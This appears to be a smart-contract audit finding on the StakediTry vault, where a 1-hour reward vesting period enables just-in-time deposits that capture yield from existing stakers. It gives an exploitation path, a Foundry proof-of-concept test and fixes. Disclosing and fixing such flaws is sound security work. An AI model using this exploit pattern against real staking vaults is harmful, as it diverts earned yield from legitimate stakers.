## Title
Just-In-Time Staking Exploit via Short Vesting Period Allows Yield Theft from Legitimate Stakers

## Summary
The `StakediTry` contract initializes `vestingPeriod` to `MIN_VESTING_PERIOD` (1 hour), enabling attackers to deposit immediately after reward distributions and extract a proportional share of yield they did not earn, diluting legitimate long-term stakers who were staked when the yield was generated. [1](#0-0) 

## Impact
**Severity**: Medium

## Finding Description

**Location:** `src/token/wiTRY/StakediTry.sol` - Constructor (line 82), `transferInRewards` function (lines 113-119), `totalAssets` function (lines 192-194), `getUnvestedAmount` function (lines 199-211)

**Intended Logic:** The vesting mechanism is designed to gradually distribute rewards to stakers over time. Rewards are added via `transferInRewards`, and the `vestingPeriod` controls how quickly they become available in `totalAssets()`, which determines share price. [2](#0-1) 

**Actual Logic:** With a 1-hour vesting period, an attacker can monitor the blockchain for `transferInRewards` transactions, deposit immediately afterward at the pre-vesting share price, wait only 1 hour for rewards to vest, and withdraw with a proportional share of yield that legitimate stakers earned.

The vulnerability exists because:
1. When rewards are distributed, `totalAssets()` remains unchanged initially since `getUnvestedAmount()` returns the full reward amount
2. Share price stays constant at the moment of reward distribution
3. Attacker deposits at this unchanged share price
4. Over 1 hour, unvested amount decreases linearly to zero
5. Attacker's shares now represent a portion of the vested yield despite not being staked when yield was earned [3](#0-2) [4](#0-3) 

**Exploitation Path:**

1. **Initial State**: Alice (legitimate staker) has 1,000 iTRY staked, holding 1,000 wiTRY shares. `totalAssets() = 1,000 iTRY`, share price = 1.0

2. **Reward Distribution (block N)**: REWARDER calls `transferInRewards(100 iTRY)`. The `_updateVestingAmount` function sets `vestingAmount = 100` and `lastDistributionTimestamp = block.timestamp`. Contract balance becomes 1,100 iTRY, but `getUnvestedAmount() = 100`, so `totalAssets() = 1,100 - 100 = 1,000`. Share price remains 1.0. [5](#0-4) 

3. **Attacker Deposits (block N or N+1)**: Bob (attacker) monitors mempool, sees the reward transaction, and immediately deposits 1,000 iTRY. He receives `1,000 * 1,000 / 1,000 = 1,000` shares at the unchanged share price. Total shares = 2,000, `totalAssets() = 2,000`.

4. **After 1 Hour**: `getUnvestedAmount() = 0` (fully vested), `totalAssets() = 2,100 iTRY`, share price = 2,100/2,000 = 1.05.
   - Alice's 1,000 shares = 1,050 iTRY (gained only 50 iTRY, should have gained 100)
   - Bob's 1,000 shares = 1,050 iTRY (gained 50 iTRY for doing nothing)

5. **Attacker Withdraws**: Bob redeems his shares for 1,050 iTRY, netting 50 iTRY profit (50% of the reward) with only 1 hour of capital lockup.

**Security Property Broken:** Yield distribution fairness - rewards should accrue to users who were staked when the yield was earned. The 1-hour vesting period allows just-in-time depositors to steal yield from legitimate stakers.

## Impact Explanation

- **Affected Assets**: iTRY yield rewards in the StakediTry vault; legitimate stakers' earned yield
- **Damage Severity**: Attackers can extract up to 50% of each reward distribution with minimal capital lockup (1 hour). With repeated exploitation on every reward cycle, legitimate stakers lose a significant portion of their expected yield over time. For example, if 100 iTRY rewards are distributed and an attacker deposits an equal amount to existing stakes, the attacker extracts 50 iTRY that should have gone to legitimate stakers.
- **User Impact**: All legitimate long-term stakers are affected. Each reward distribution becomes an opportunity for attackers to dilute their yield. This undermines the core value proposition of staking wiTRY.

## Likelihood Explanation

- **Attacker Profile**: Any user with capital can execute this attack. No special privileges required.
- **Preconditions**: 
  - StakediTry vault has existing stakers
  - Reward distributions occur via `transferInRewards`
  - `vestingPeriod` is set to 1 hour (as initialized in constructor)
- **Execution Complexity**: Very low - attacker monitors mempool for `transferInRewards` transactions, submits deposit transaction immediately after (can even be in the same block), waits 1 hour, and withdraws. Can be automated with a bot.
- **Frequency**: Repeatable on every reward distribution cycle. The shorter the vesting period, the more practical and profitable the attack becomes.

## Recommendation

Set a longer initial vesting period to increase the opportunity cost and risk for attackers, making the exploit economically unviable:

```solidity
// In src/token/wiTRY/StakediTry.sol, constructor, line 82:

// CURRENT (vulnerable):
vestingPeriod = MIN_VESTING_PERIOD; // 1 hour - too short

// FIXED:
vestingPeriod = 7 days; // Longer default period increases attacker's capital lockup and risk
// Admin can adjust later via setVestingPeriod if needed
```

**Alternative Mitigations:**

1. **Implement deposit delays**: Require new deposits to wait before becoming eligible for yield distribution
2. **Use snapshot-based rewards**: Distribute rewards only to addresses that were staked at the time of the previous distribution
3. **Increase MIN_VESTING_PERIOD**: Change the minimum from 1 hour to at least 1 day, and use 7-30 days as the default to make attacks economically impractical due to:
   - Extended capital lockup period
   - Price volatility risk over longer timeframes
   - Higher opportunity cost of capital

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTry.sol";
import "./mocks/MockERC20.sol";

/**
 * @title Just-In-Time Staking Exploit PoC
 * @notice Demonstrates how short vesting period allows yield theft
 * Run with: forge test --match-test test_JustInTimeStakingExploit -vvv
 */
contract JustInTimeStakingExploitTest is Test {
    StakediTry public stakediTry;
    MockERC20 public iTryToken;
    
    address public admin;
    address public rewarder;
    address public alice; // Legitimate staker
    address public bob;   // Attacker
    
    uint256 constant ALICE_INITIAL_STAKE = 1000e18;
    uint256 constant REWARD_AMOUNT = 100e18;
    uint256 constant BOB_ATTACK_AMOUNT = 1000e18;
    
    function setUp() public {
        admin = makeAddr("admin");
        rewarder = makeAddr("rewarder");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        
        // Deploy mock iTRY token
        iTryToken = new MockERC20("iTRY", "iTRY");
        
        // Deploy StakediTry with 1-hour vesting period (vulnerable config)
        vm.prank(admin);
        stakediTry = new StakediTry(IERC20(address(iTryToken)), rewarder, admin);
        
        // Mint tokens
        iTryToken.mint(alice, ALICE_INITIAL_STAKE);
        iTryToken.mint(bob, BOB_ATTACK_AMOUNT);
        iTryToken.mint(rewarder, REWARD_AMOUNT);
        
        // Approvals
        vm.prank(alice);
        iTryToken.approve(address(stakediTry), type(uint256).max);
        
        vm.prank(bob);
        iTryToken.approve(address(stakediTry), type(uint256).max);
        
        vm.prank(rewarder);
        iTryToken.approve(address(stakediTry), type(uint256).max);
    }
    
    function test_JustInTimeStakingExploit() public {
        // ===== STEP 1: Alice stakes legitimately =====
        vm.prank(alice);
        uint256 aliceShares = stakediTry.deposit(ALICE_INITIAL_STAKE, alice);
        
        assertEq(aliceShares, ALICE_INITIAL_STAKE, "Alice should get 1:1 shares initially");
        assertEq(stakediTry.totalAssets(), ALICE_INITIAL_STAKE, "Total assets should equal Alice's stake");
        
        uint256 sharePrice1 = (stakediTry.totalAssets() * 1e18) / stakediTry.totalSupply();
        console.log("Initial share price:", sharePrice1);
        
        // ===== STEP 2: Rewarder distributes yield =====
        vm.prank(rewarder);
        stakediTry.transferInRewards(REWARD_AMOUNT);
        
        // Immediately after reward distribution, totalAssets unchanged due to vesting
        uint256 totalAssetsAfterReward = stakediTry.totalAssets();
        assertEq(totalAssetsAfterReward, ALICE_INITIAL_STAKE, 
            "Total assets should remain unchanged immediately after reward due to vesting");
        
        uint256 sharePrice2 = (stakediTry.totalAssets() * 1e18) / stakediTry.totalSupply();
        console.log("Share price after reward (unvested):", sharePrice2);
        assertEq(sharePrice2, sharePrice1, "Share price should not change immediately after reward");
        
        // ===== STEP 3: Bob (attacker) deposits immediately after reward =====
        vm.prank(bob);
        uint256 bobShares = stakediTry.deposit(BOB_ATTACK_AMOUNT, bob);
        
        // Bob gets shares at the unchanged price
        assertEq(bobShares, BOB_ATTACK_AMOUNT, "Bob should get shares at pre-vesting price");
        
        uint256 totalShares = stakediTry.totalSupply();
        assertEq(totalShares, ALICE_INITIAL_STAKE + BOB_ATTACK_AMOUNT, "Total shares");
        
        console.log("Alice shares:", aliceShares);
        console.log("Bob shares:", bobShares);
        console.log("Total shares:", totalShares);
        
        // ===== STEP 4: Fast forward 1 hour (MIN_VESTING_PERIOD) =====
        vm.warp(block.timestamp + 1 hours);
        
        // Now rewards are fully vested
        uint256 unvestedAmount = stakediTry.getUnvestedAmount();
        assertEq(unvestedAmount, 0, "Rewards should be fully vested after 1 hour");
        
        uint256 totalAssetsAfterVesting = stakediTry.totalAssets();
        assertEq(totalAssetsAfterVesting, ALICE_INITIAL_STAKE + BOB_ATTACK_AMOUNT + REWARD_AMOUNT,
            "Total assets should include all rewards after vesting");
        
        uint256 sharePrice3 = (stakediTry.totalAssets() * 1e18) / stakediTry.totalSupply();
        console.log("Share price after vesting:", sharePrice3);
        
        // ===== STEP 5: Calculate yield distribution =====
        uint256 aliceValue = stakediTry.previewRedeem(aliceShares);
        uint256 bobValue = stakediTry.previewRedeem(bobShares);
        
        uint256 aliceYield = aliceValue - ALICE_INITIAL_STAKE;
        uint256 bobYield = bobValue - BOB_ATTACK_AMOUNT;
        
        console.log("Alice's position value:", aliceValue);
        console.log("Bob's position value:", bobValue);
        console.log("Alice's yield:", aliceYield);
        console.log("Bob's yield:", bobYield);
        
        // ===== VULNERABILITY CONFIRMED =====
        // Alice should have received all 100 iTRY of yield since she was staked
        // when the yield was earned, but instead the yield is split 50/50
        assertEq(aliceYield, 50e18, "Alice only got 50% of yield she earned");
        assertEq(bobYield, 50e18, "Bob extracted 50% of yield he didn't earn");
        assertLt(aliceYield, REWARD_AMOUNT, "Alice lost portion of her earned yield");
        
        // ===== STEP 6: Bob withdraws with profit =====
        vm.prank(bob);
        stakediTry.redeem(bobShares, bob, bob);
        
        uint256 bobFinalBalance = iTryToken.balanceOf(bob);
        uint256 bobProfit = bobFinalBalance - BOB_ATTACK_AMOUNT;
        
        console.log("Bob's profit:", bobProfit);
        assertEq(bobProfit, 50e18, "Bob profited 50 iTRY with only 1 hour capital lockup");
        
        // Confirm the exploit
        assertTrue(bobProfit > 0, "EXPLOIT CONFIRMED: Bob stole yield from Alice");
        assertTrue(aliceYield < REWARD_AMOUNT, "EXPLOIT CONFIRMED: Alice lost her earned yield");
    }
}
```

**Notes:**

- The vulnerability is particularly severe because the 1-hour vesting period makes it highly practical for automated bots to exploit every reward distribution
- The exploit requires no special privileges and can be executed by any user
- The attack can be repeated on every reward cycle, causing cumulative yield loss for legitimate stakers
- While the vesting mechanism itself is a valid design pattern, the 1-hour initial period is too short and creates an exploitable economic imbalance
- The admin can later adjust the vesting period via `setVestingPeriod`, but only when no rewards are vesting, and the vulnerable 1-hour period exists from deployment until the first adjustment

### Citations

**File:** src/token/wiTRY/StakediTry.sol (L82-82)
```text
        vestingPeriod = MIN_VESTING_PERIOD;
```

**File:** src/token/wiTRY/StakediTry.sol (L113-119)
```text
    function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
        _updateVestingAmount(amount);
        // transfer assets from rewarder to this contract
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);

        emit RewardsReceived(amount);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L192-194)
```text
    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L199-211)
```text
    function getUnvestedAmount() public view returns (uint256) {
        uint256 timeSinceLastDistribution = block.timestamp - lastDistributionTimestamp;

        if (timeSinceLastDistribution >= vestingPeriod) {
            return 0;
        }

        uint256 deltaT;
        unchecked {
            deltaT = (vestingPeriod - timeSinceLastDistribution);
        }
        return (deltaT * vestingAmount) / vestingPeriod;
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L280-285)
```text
    function _updateVestingAmount(uint256 newVestingAmount) internal {
        if (getUnvestedAmount() > 0) revert StillVesting();

        vestingAmount = newVestingAmount;
        lastDistributionTimestamp = block.timestamp;
    }
```
